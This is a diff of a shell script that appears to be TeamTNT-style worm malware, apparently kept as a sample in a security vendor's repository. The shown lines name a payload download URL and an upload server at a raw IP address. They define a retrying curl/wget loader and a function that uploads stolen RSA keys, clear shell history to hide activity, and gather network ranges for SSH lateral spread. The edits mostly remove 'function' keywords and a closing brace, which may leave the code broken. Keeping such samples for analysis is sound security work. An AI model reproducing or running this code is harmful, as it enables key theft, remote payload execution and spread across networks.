@@ -11,11 +11,10 @@ else
 echo "replay .. i know this server ..."
 exit
 fi
-
+ 
 PWNWITHTHISLINK="https://raw.githubusercontent.com/accuknox/samples/main/tntbot/Bot"
 RSAUPLOAD="http://152.67.166.153:8000"
-
-function setupmyapps(){
+setupmyapps(){
 	
 apt-get update --fix-missing 2>/dev/null 1>/dev/null
 yum clean all 2>/dev/null 1>/dev/null
@@ -28,7 +27,7 @@ apk update 2>/dev/null 1>/dev/null
 apk add curl wget bash make gcc 2>/dev/null 1>/dev/null
 }
 
-function loadthisfile(){
+ loadthisfile(){
 GETFROM=$1
 PUTITTO=$2
 
@@ -44,7 +43,6 @@ CURLPARA="-L --max-redirs 5 --insecure --silent"
 
 curl --referer $REFERER --user-agent=TNTcurl $CURLPARA $GETFROM -o $PUTITTO || curl --referer $REFERER --user-agent=TNTcurl $CURLPARA $GETFROM -o $PUTITTO || curl --referer $REFERER --user-agent=TNTcurl $CURLPARA $GETFROM -o $PUTITTO ||  curl --referer $REFERER --user-agent=TNTcurl $CURLPARA $GETFROM -o $PUTITTO || wget --referer=$REFERER --user-agent=TNTwget $WGETPARA $GETFROM -O $PUTITTO || wget --referer=$REFERER --user-agent=TNTwget $WGETPARA $GETFROM -O $PUTITTO || wget --referer=$REFERER --user-agent=TNTwget $WGETPARA $GETFROM -O $PUTITTO || wget --referer=$REFERER --user-agent=TNTwget $WGETPARA $GETFROM -O $PUTITTO
 
-}	
 
 if [ -f "/bin/sbin" ]; then
 echo 'FOUND: sbin'
@@ -104,7 +102,7 @@ rm -rf .x112 ps 2>/dev/null 1>/dev/null
 fi
 }
 
-function uploadthersa(){
+ uploadthersa(){
 
 mkdir /dev/shm/ -p 2>/dev/null
 
@@ -116,7 +114,7 @@ rm -f /dev/shm/rsa.up.tar.gz
 history -c
 }
 
-function getsomelanssh(){
+ getsomelanssh(){
 mkdir /home/hilde/.ssh/ -p 2>/dev/null 1>/dev/null
 > /home/hilde/.ssh/known_hosts 2>/dev/null 1>/dev/null
 ip route show | grep -v grep | grep -v blackhole | grep "/" | awk '{print $1}' >> /home/hilde/.ssh/.ranges
@@ -193,4 +191,3 @@ fi
 
 rm -f /home/hilde/.ssh/known_hosts 2>/dev/null
 history -c
-
